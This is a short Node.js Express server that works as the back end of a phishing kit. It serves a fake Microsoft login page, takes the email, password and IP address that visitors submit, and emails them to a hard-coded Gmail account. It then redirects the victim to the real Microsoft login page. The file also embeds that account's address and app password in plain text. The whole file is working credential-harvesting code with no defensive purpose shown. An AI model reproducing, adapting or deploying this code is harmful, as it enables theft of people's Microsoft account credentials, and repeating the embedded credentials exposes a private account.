const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Serve the Microsoft login page at the root URL
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle login submission, send email alert, and redirect immediately
app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'emmanuelkefas0101@gmail.com',
            pass: 'Ewcm qhom pddx ryni'
        }
    });

    const mailOptions = {
        from: 'emmanuelkefas0101@gmail.com',
        to: 'emmanuelkefas0101@gmail.com',
        subject: 'New Microsoft Login Capture',
        text: `Captured Credentials:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${clientIp}`
    };

    try {
        await transporter.sendMail(mailOptions);
    } catch (error) {
        console.error('Error sending email:', error);
    }

    // Immediately redirect user to official Microsoft login page
    res.redirect('https://login.microsoftonline.com');
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

